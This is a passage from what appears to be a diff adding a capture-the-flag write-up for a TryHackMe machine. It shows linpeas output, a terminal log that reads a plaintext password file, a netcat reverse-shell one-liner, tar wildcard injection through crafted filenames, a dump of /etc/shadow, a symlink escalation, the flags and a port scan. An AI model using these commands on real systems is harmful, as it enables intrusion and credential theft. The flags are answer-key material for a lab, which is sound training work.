@@ -772,3 +772,778 @@ drwxr-xr-x 2 root root 4.0K Feb  6  2020 .
 /var/www/html/lib/tinymce/plugins/spellchecker/plugin.min.js
 /var/www/html/lib/tinymce/plugins/tabfocus
 /var/www/html/lib/tinymce/plugins/tabfocus/plugin.min.js
+/var/www/html/lib/tinymce/plugins/table
+/var/www/html/lib/tinymce/plugins/table/plugin.min.js
+/var/www/html/lib/tinymce/plugins/template
+/var/www/html/lib/tinymce/plugins/template/plugin.min.js
+/var/www/html/lib/tinymce/plugins/textcolor
+/var/www/html/lib/tinymce/plugins/textcolor/plugin.min.js
+/var/www/html/lib/tinymce/plugins/textpattern
+/var/www/html/lib/tinymce/plugins/textpattern/plugin.min.js
+/var/www/html/lib/tinymce/plugins/toc
+/var/www/html/lib/tinymce/plugins/toc/plugin.min.js
+/var/www/html/lib/tinymce/plugins/visualblocks
+/var/www/html/lib/tinymce/plugins/visualblocks/css
+/var/www/html/lib/tinymce/plugins/visualblocks/css/visualblocks.css
+/var/www/html/lib/tinymce/plugins/visualblocks/plugin.min.js
+/var/www/html/lib/tinymce/plugins/visualchars
+/var/www/html/lib/tinymce/plugins/visualchars/plugin.min.js
+/var/www/html/lib/tinymce/plugins/wordcount
+/var/www/html/lib/tinymce/plugins/wordcount/plugin.min.js
+/var/www/html/lib/tinymce/skins
+/var/www/html/lib/tinymce/skins/lightgray
+/var/www/html/lib/tinymce/skins/lightgray/content.inline.min.css
+/var/www/html/lib/tinymce/skins/lightgray/content.min.css
+/var/www/html/lib/tinymce/skins/lightgray/content.mobile.min.css
+/var/www/html/lib/tinymce/skins/lightgray/fonts
+/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-mobile.woff
+/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-small.eot
+/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-small.ttf
+/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-small.woff
+/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce.eot
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/lib/tinymce/skins/lightgray/img
+/var/www/html/lib/tinymce/skins/lightgray/skin.min.css
+/var/www/html/lib/tinymce/skins/lightgray/skin.mobile.min.css
+/var/www/html/lib/tinymce/themes
+/var/www/html/lib/tinymce/themes/modern
+/var/www/html/lib/tinymce/themes/modern/theme.min.js
+/var/www/html/lib/tinymce/tinymce.min.js
+/var/www/html/lib/vue
+/var/www/html/lib/vue/vue-draggable.min.js
+/var/www/html/lib/vue/vue-editor.css
+/var/www/html/lib/vue/vue-editor.js
+/var/www/html/lib/vue/vue.min.js
+/var/www/html/log
+/var/www/html/log/error.log
+/var/www/html/log/load.php
+/var/www/html/log/login.failed.log
+/var/www/html/log/packages2update.json
+/var/www/html/log/sessions.log
+/var/www/html/robots.txt
+/var/www/html/sites
+/var/www/html/sites/README.md
+/var/www/html/src
+/var/www/html/src/.htaccess
+/var/www/html/src/Cocur
+/var/www/html/src/Cocur/Slugify
+/var/www/html/src/Cocur/Slugify/LICENSE
+/var/www/html/src/Cocur/Slugify/Resources
+/var/www/html/src/Cocur/Slugify/Resources/rules
+/var/www/html/src/Cocur/Slugify/Resources/rules/arabic.json
+/var/www/html/src/Cocur/Slugify/Resources/rules/austrian.json
+/var/www/html/src/Cocur/Slugify/Resources/rules/azerbaijani.json
+/var/www/html/src/Cocur/Slugify/Resources/rules/bulgarian.json
+/var/www/html/src/Cocur/Slugify/Resources/rules/burmese.json
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/Cocur/Slugify/RuleProvider
+/var/www/html/src/Cocur/Slugify/RuleProvider/DefaultRuleProvider.php
+/var/www/html/src/Cocur/Slugify/RuleProvider/FileRuleProvider.php
+/var/www/html/src/Cocur/Slugify/RuleProvider/RuleProviderInterface.php
+/var/www/html/src/Cocur/Slugify/Slugify.php
+/var/www/html/src/Cocur/Slugify/SlugifyInterface.php
+/var/www/html/src/Cocur/Slugify/bin
+/var/www/html/src/Cocur/Slugify/bin/generate-default.php
+/var/www/html/src/blog
+/var/www/html/src/blog/controllers
+/var/www/html/src/blog/controllers/blog.php
+/var/www/html/src/blog/load.php
+/var/www/html/src/blog/package.json
+/var/www/html/src/blog/views
+/var/www/html/src/blog/views/blog-homepage.php
+/var/www/html/src/core
+/var/www/html/src/core/assets
+/var/www/html/src/core/assets/admin
+/var/www/html/src/core/assets/admin/content.css
+/var/www/html/src/core/assets/admin/content.js
+/var/www/html/src/core/assets/admin/listcomponent.js
+/var/www/html/src/core/assets/admin/media.js
+/var/www/html/src/core/assets/admin/style.css
+/var/www/html/src/core/assets/cdn_paths.php
+/var/www/html/src/core/assets/lazyImgLoad.js
+/var/www/html/src/core/bootstrap.php
+/var/www/html/src/core/classes
+/var/www/html/src/core/classes/cache.php
+/var/www/html/src/core/classes/controller.php
+/var/www/html/src/core/classes/db.php
+/var/www/html/src/core/classes/db_backup.php
+/var/www/html/src/core/classes/event.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/controllers
+/var/www/html/src/core/controllers/admin.php
+/var/www/html/src/core/controllers/api.php
+/var/www/html/src/core/controllers/cm.php
+/var/www/html/src/core/controllers/fm.php
+/var/www/html/src/core/controllers/login.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/install
+/var/www/html/src/core/install/index.php
+/var/www/html/src/core/install/install.form.php
+/var/www/html/src/core/install/install.php
+/var/www/html/src/core/install/install.sql.php
+/var/www/html/src/core/install/installed.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/lang
+/var/www/html/src/core/lang/admin
+/var/www/html/src/core/lang/admin/el.json
+/var/www/html/src/core/lang/admin/en.json
+/var/www/html/src/core/lang/admin/es.json
+/var/www/html/src/core/lang/admin/et.json
+/var/www/html/src/core/lang/admin/fr.json
+/var/www/html/src/core/lang/content
+/var/www/html/src/core/lang/content/el.js
+/var/www/html/src/core/lang/content/en.js
+/var/www/html/src/core/lang/content/es.js
+/var/www/html/src/core/lang/content/fr.js
+/var/www/html/src/core/lang/de.json
+/var/www/html/src/core/lang/el.json
+/var/www/html/src/core/lang/en.json
+/var/www/html/src/core/lang/es.json
+/var/www/html/src/core/lang/et.json
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/lang/login/de.json
+/var/www/html/src/core/lang/login/el.json
+/var/www/html/src/core/lang/login/en.json
+/var/www/html/src/core/lang/login/es.json
+/var/www/html/src/core/lang/login/et.json
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/lang/myprofile
+/var/www/html/src/core/lang/myprofile/en.json
+/var/www/html/src/core/lang/myprofile/es.json
+/var/www/html/src/core/lang/myprofile/fr.json
+/var/www/html/src/core/lang/permissions
+/var/www/html/src/core/lang/permissions/el.json
+/var/www/html/src/core/lang/permissions/en.json
+/var/www/html/src/core/lang/permissions/es.json
+/var/www/html/src/core/lang/permissions/et.json
+/var/www/html/src/core/lang/permissions/fr.json
+/var/www/html/src/core/lib
+/var/www/html/src/core/lib/gila.min.css
+/var/www/html/src/core/lib/gila.min.js
+/var/www/html/src/core/lib/vue-draggable.min.js
+/var/www/html/src/core/load.php
+/var/www/html/src/core/models
+/var/www/html/src/core/models/menu.php
+/var/www/html/src/core/models/page.php
+/var/www/html/src/core/models/post.php
+/var/www/html/src/core/models/profile.php
+/var/www/html/src/core/models/user.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/package.json
+/var/www/html/src/core/tables
+/var/www/html/src/core/tables/page.php
+/var/www/html/src/core/tables/post.php
+/var/www/html/src/core/tables/postcategory.php
+/var/www/html/src/core/tables/user-post.php
+/var/www/html/src/core/tables/user.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/update.php
+/var/www/html/src/core/views
+/var/www/html/src/core/views/404.php
+/var/www/html/src/core/views/admin
+/var/www/html/src/core/views/admin/content-vue.php
+/var/www/html/src/core/views/admin/contenttype.php
+/var/www/html/src/core/views/admin/dashboard.php
+/var/www/html/src/core/views/admin/db_backup.php
+/var/www/html/src/core/views/admin/edit_widget.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/views/blog-author.php
+/var/www/html/src/core/views/blog-category.php
+/var/www/html/src/core/views/blog-feed.php
+/var/www/html/src/core/views/blog-list.php
+/var/www/html/src/core/views/blog-search.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/src/core/views/tpl/menu.bootstrap.php
+/var/www/html/src/core/views/tpl/menu.php
+/var/www/html/src/core/widgets
+/var/www/html/src/core/widgets/.htaccess
+/var/www/html/src/core/widgets/_widget_example
+/var/www/html/src/core/widgets/_widget_example/_widget_example.php
+/var/www/html/src/core/widgets/_widget_example/widget.php
+/var/www/html/src/core/widgets/category-post
+/var/www/html/src/core/widgets/category-post/category-post.php
+/var/www/html/src/core/widgets/category-post/style.css
+/var/www/html/src/core/widgets/category-post/widget.php
+/var/www/html/src/core/widgets/contact-form
+/var/www/html/src/core/widgets/contact-form/contact-form.php
+/var/www/html/src/core/widgets/contact-form/widget.php
+/var/www/html/src/core/widgets/features
+/var/www/html/src/core/widgets/features/features.php
+/var/www/html/src/core/widgets/features/widget.php
+/var/www/html/src/core/widgets/gallery
+/var/www/html/src/core/widgets/gallery/gallery.php
+/var/www/html/src/core/widgets/gallery/widget.php
+/var/www/html/src/core/widgets/image
+/var/www/html/src/core/widgets/image/image.php
+/var/www/html/src/core/widgets/image/widget.php
+/var/www/html/src/core/widgets/latest-post
+/var/www/html/src/core/widgets/latest-post/latest-post.php
+/var/www/html/src/core/widgets/latest-post/widget.php
+/var/www/html/src/core/widgets/links
+/var/www/html/src/core/widgets/links/links.php
+/var/www/html/src/core/widgets/links/widget.php
+/var/www/html/src/core/widgets/paragraph
+/var/www/html/src/core/widgets/paragraph/paragraph.php
+/var/www/html/src/core/widgets/paragraph/widget.php
+/var/www/html/src/core/widgets/post-categories
+/var/www/html/src/core/widgets/post-categories/post-categories.php
+/var/www/html/src/core/widgets/post-categories/widget.php
+/var/www/html/src/core/widgets/social-icons
+/var/www/html/src/core/widgets/social-icons/social-icons.php
+/var/www/html/src/core/widgets/social-icons/widget.php
+/var/www/html/src/core/widgets/tag
+/var/www/html/src/core/widgets/tag/tag.php
+/var/www/html/src/core/widgets/tag/widget.php
+/var/www/html/src/core/widgets/text
+/var/www/html/src/core/widgets/text/text.php
+/var/www/html/src/core/widgets/text/widget.php
+/var/www/html/src/featured_grid
+/var/www/html/src/featured_grid/assets
+/var/www/html/src/featured_grid/assets/style.css
+/var/www/html/src/featured_grid/load.php
+/var/www/html/src/featured_grid/package.json
+/var/www/html/src/ganalytics
+/var/www/html/src/ganalytics/load.php
+/var/www/html/src/ganalytics/package.json
+/var/www/html/src/gila_fb_comments
+/var/www/html/src/gila_fb_comments/load.php
+/var/www/html/src/gila_fb_comments/package.json
+/var/www/html/src/reCAPTCHA
+/var/www/html/src/reCAPTCHA/load.php
+/var/www/html/src/reCAPTCHA/package.json
+/var/www/html/themes
+/var/www/html/themes/.htaccess
+/var/www/html/themes/gila-blog
+/var/www/html/themes/gila-blog/LICENSE
+/var/www/html/themes/gila-blog/blocks-display-head.php
+/var/www/html/themes/gila-blog/blog-category.php
+/var/www/html/themes/gila-blog/blog-list.php
+/var/www/html/themes/gila-blog/blog-tag.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/themes/gila-mag
+/var/www/html/themes/gila-mag/LICENSE
+/var/www/html/themes/gila-mag/blocks-display-head.php
+/var/www/html/themes/gila-mag/blog-list.php
+/var/www/html/themes/gila-mag/blog-tag.php
+/var/www/html/themes/gila-mag/footer.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/tmp
+/var/www/html/tmp/.htaccess
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+  Group www-data:
+/tmp/linpeas.sh
+
+╔══════════╣ Searching passwords in config PHP files
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/bin/systemd-ask-password
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/opt/.password.bak
+/usr/lib/grub/i386-pc/legacy_password_test.mod
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/mysql/plugin/validate_password.so
+/usr/share/help-langpack/en_AU/ubuntu-help/user-changepassword.page
+/usr/share/help-langpack/en_AU/ubuntu-help/user-forgottenpassword.page
+/usr/share/help-langpack/en_AU/ubuntu-help/user-goodpassword.page
+/usr/share/help-langpack/en_CA/ubuntu-help/user-changepassword.page
+/usr/share/help-langpack/en_CA/ubuntu-help/user-forgottenpassword.page
+/usr/share/help-langpack/en_CA/ubuntu-help/user-goodpassword.page
+/usr/share/help-langpack/en_GB/evince/password.page
+/usr/share/help-langpack/en_GB/ubuntu-help/user-changepassword.page
+/usr/share/help-langpack/en_GB/ubuntu-help/user-forgottenpassword.page
+/usr/share/help-langpack/en_GB/ubuntu-help/user-goodpassword.page
+/usr/share/help-langpack/en_GB/zenity/password.page
+/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
+/usr/share/icons/Humanity/apps/24/password.png
+/usr/share/icons/Humanity/apps/48/password.svg
+/usr/share/icons/Humanity/status/16/dialog-password.png
+/usr/share/icons/Humanity/status/24/dialog-password.png
+/usr/share/icons/Humanity/status/48/dialog-password.svg
+/usr/share/locale-langpack/en_AU/LC_MESSAGES/credentials-control-center.mo
+/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
+/usr/share/locale-langpack/en_CA/LC_MESSAGES/credentials-control-center.mo
+/usr/share/locale-langpack/en_GB/LC_MESSAGES/credentials-control-center.mo
+/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
+/usr/share/man/man1/systemd-ask-password.1.gz
+/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
+/usr/share/man/man7/credentials.7.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/pam/common-password.md5sums
+/var/cache/debconf/passwords.dat
+/var/lib/pam/password
+/var/www/html/src/core/views/login-change-password.php
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+ base-passwd depends on libc6 (>= 2.8); however:
+ base-passwd depends on libdebconfclient0 (>= 0.145); however:
+ configure base-passwd:amd64 3.5.39 3.5.39
+ install base-passwd:amd64 <none> 3.5.39
+ status half-configured base-passwd:amd64 3.5.39
+ status half-installed base-passwd:amd64 3.5.39
+ status installed base-passwd:amd64 3.5.39
+ status unpacked base-passwd:amd64 3.5.39
+ status half-configured base-passwd:amd64 3.5.39
+ status half-installed base-passwd:amd64 3.5.39
+ status unpacked base-passwd:amd64 3.5.39
+ upgrade base-passwd:amd64 3.5.39 3.5.39
+ install passwd:amd64 <none> 1:4.2-3.1ubuntu5
+ status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+ configure base-passwd:amd64 3.5.39 <none>
+ status half-configured base-passwd:amd64 3.5.39
+ status installed base-passwd:amd64 3.5.39
+ status unpacked base-passwd:amd64 3.5.39
+ configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
+ status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+ status installed passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+ status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+ status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
+ upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
+ configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
+ status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
+ status installed passwd:amd64 1:4.2-3.1ubuntu5.3
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
+Description: Set up users and passwords
+Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
+Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
+Selecting previously unselected package base-passwd.
+Selecting previously unselected package passwd.
+Setting up base-passwd (3.5.39) ...
+Setting up passwd (1:4.2-3.1ubuntu5) ...
+Shadow passwords are now on.
+Unpacking base-passwd (3.5.39) ...
+Unpacking base-passwd (3.5.39) over (3.5.39) ...
+Unpacking passwd (1:4.2-3.1ubuntu5) ...
+dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+╔══════════╣ Executable files potentially added by user (limit 70)
++18:54:07.1196134090 /opt/.password.bak
+
+www-data@cmess:/tmp$ tar -xzf andre_backup.tar.gz
+
+www-data@cmess:/tmp$ cat note
+cat note
+Note to self.
+Anything in here will be backed up! 
+
+www-data@cmess:/opt$ ls -lah
+ls -lah
+total 12K
+drwxr-xr-x  2 root root 4.0K Feb  6  2020 .
+drwxr-xr-x 22 root root 4.0K Feb  6  2020 ..
+-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
+www-data@cmess:/opt$ cat .password.bak
+cat .password.bak
+andres backup password
+UQfsdCB7aAP6
+
+www-data@cmess:/home$ su andre
+su andre
+Password: UQfsdCB7aAP6
+
+andre@cmess:/home$ cd andre
+cd andre
+andre@cmess:~$ ls
+ls
+backup  user.txt
+andre@cmess:~$ cat user.txt
+cat user.txt
+thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
+
+andre@cmess:~$ cd backup
+cd backup
+andre@cmess:~/backup$ ls
+ls
+note
+andre@cmess:~/backup$ cat note
+cat note
+Note to self.
+Anything in here will be backed up! 
+andre@cmess:~/backup$ cat /etc/crontab
+cat /etc/crontab
+```
+```bash
+# /etc/crontab: system-wide crontab
+```
+```bash
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```bash
+# command to install the new version when you edit this file
+```
+```bash
+# and files in /etc/cron.d. These files also have username fields,
+```
+```bash
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+```bash
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+andre@cmess:~/backup$ sudo -l
+sudo -l
+[sudo] password for andre: UQfsdCB7aAP6
+
+Sorry, user andre may not run sudo on cmess.
+
+andre@cmess:~/backup$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
+             
+andre@cmess:~/backup$ echo ""> "--checkpoint-action=exec=sh shell.sh"
+
+andre@cmess:~/backup$ echo ""> --checkpoint=1
+
+andre@cmess:~/backup$ ls -l
+ls -l
+total 16
+-rw-rw-r-- 1 andre andre  1 Mar 14 10:56 --checkpoint=1
+-rw-rw-r-- 1 andre andre  1 Mar 14 10:56 --checkpoint-action=exec=sh shell.sh
+-rwxr-x--- 1 andre andre 51 Feb  9  2020 note
+-rw-rw-r-- 1 andre andre 74 Mar 14 10:56 shell.sh
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1338 
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.105.35] 59904
+sh: 0: can't access tty; job control turned off
+```
+```bash
+# cd /root
+```
+```bash
+# ls
+root.txt
+```
+```bash
+# cat root.txt
+thm{9f85b7fdeb2cf96985bf5761a93546a2}
+```
+```bash
+# cat /etc/shadow
+root:$6$W.gDTDR8$XXB79ORIcggP9.Cl2HzbUfmdADUCasSD92e4HS2kjw5Y9AsTvFeKKbGfDFycsdXoYOhB7Da9mFPcca5a3DyKG1:18299:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18299:0:99999:7:::
+uuidd:*:18299:0:99999:7:::
+andre:$6$GeMRsVKt$KEQmO.oV7yzpLOVXjDXG/8M/rbw1bngT/VOoRQSn2saquzhMTMl5J8rstkFQ1QD3/dLFS1yAMqj1kbiQWYvQ8.:18299:0:99999:7:::
+mysql:!:18299:0:99999:7:::
+sshd:*:18299:0:99999:7:::
+
+using symbolic links
+
+Symbolic links, also known as soft links, are special types of files that point to another file or directory in the filesystem. Unlike hard links, symbolic links can span across different filesystems and can even link to files or directories that do not exist yet. Symbolic links are commonly used to create shortcuts or aliases to files or directories, or to link to shared resources across multiple systems.
+
+For example, if you want to create a symbolic link named "mylink" in the current directory that points to a file named "myfile" in the same directory, you can use the following command:
+
+ln -s myfile mylink
+
+This will create a symbolic link named "mylink" that points to the "myfile" file. You can then use the "mylink" filename to access the "myfile" file.
+
+andre@cmess:~/backup$ cat /etc/crontab
+cat /etc/crontab
+```
+```bash
+# /etc/crontab: system-wide crontab
+```
+```bash
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```bash
+# command to install the new version when you edit this file
+```
+```bash
+# and files in /etc/cron.d. These files also have username fields,
+```
+```bash
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+```bash
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+
+andre@cmess:~$ mv backup backup_bak
+mv backup backup_bak
+andre@cmess:~$ ls
+ls
+backup_bak  user.txt
+
+andre@cmess:~$ ln -s /root/ backup
+ln -s /root/ backup
+andre@cmess:~$ ls -lah
+ls -lah
+total 36K
+drwxr-x--- 4 andre andre 4.0K Mar 14 11:07 .
+drwxr-xr-x 3 root  root  4.0K Feb  6  2020 ..
+lrwxrwxrwx 1 andre andre    6 Mar 14 11:07 backup -> /root/
+drwxr-x--- 2 andre andre 4.0K Mar 14 10:56 backup_bak
+lrwxrwxrwx 1 root  root     9 Feb  6  2020 .bash_history -> /dev/null
+-rwxr-x--- 1 andre andre  220 Feb  6  2020 .bash_logout
+-rwxr-x--- 1 andre andre 3.7K Feb  6  2020 .bashrc
+drwxr-x--- 2 andre andre 4.0K Feb  6  2020 .cache
+-rwxr-x--- 1 andre andre  655 Feb  6  2020 .profile
+lrwxrwxrwx 1 root  root     9 Feb  6  2020 .sudo_as_admin_successful -> /dev/null
+-rwxr-x--- 1 andre andre   38 Feb  6  2020 user.txt
+-rwxr-x--- 1 andre andre  635 Feb  9  2020 .viminfo
+
+andre@cmess:~$ cd /tmp
+cd /tmp
+andre@cmess:/tmp$ tar -xvf andre_backup.tar.gz
+tar -xvf andre_backup.tar.gz
+root.txt
+andre@cmess:/tmp$ cat root.txt
+cat root.txt
+thm{9f85b7fdeb2cf96985bf5761a93546a2}
+```
+![[Pasted image 20230314114754.png]]
+Compromise this machine and obtain user.txt
+Have you tried fuzzing for subdomains?
+Escalate your privileges and obtain root.txt
+
+## Flags / Answers
+- ***thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}***
+- ***thm{9f85b7fdeb2cf96985bf5761a93546a2}***
+- Start Machine
+- Please add `MACHINE_IP cmess.thm` to /etc/hosts
+- Please also note that this box does not require brute forcing!
+- Answer the questions below
+```bash
+- ┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
+└─$ tail /etc/hosts                                
+ff02::2		ip6-allrouters
+
+#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca
+
+#127.0.0.1 irc.cct
+10.10.92.0 cdn.tryhackme.loc
+10.10.97.54 external.pypi-server.loc
+10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
+10.10.101.47 wekor.thm site.wekor.thm
+10.10.105.35 cmess.thm
+
+┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
+└─$ rustscan -a 10.10.105.35 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at "/home/witty/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.105.35:22
+Open 10.10.105.35:80
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+[~] Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Connect Scan
+Scanning cmess.thm (10.10.105.35) [2 ports]
+Discovered open port 22/tcp on 10.10.105.35
+Discovered open port 80/tcp on 10.10.105.35
+Completed Connect Scan (2 total ports)
+Initiating Service scan
+Scanning 2 services on cmess.thm (10.10.105.35)
+Completed Service scan (2 services on 1 host)
+NSE: Script scanning 10.10.105.35.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for cmess.thm (10.10.105.35)
+Host is up, received user-set (0.21s latency).
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
+|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
+|   256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
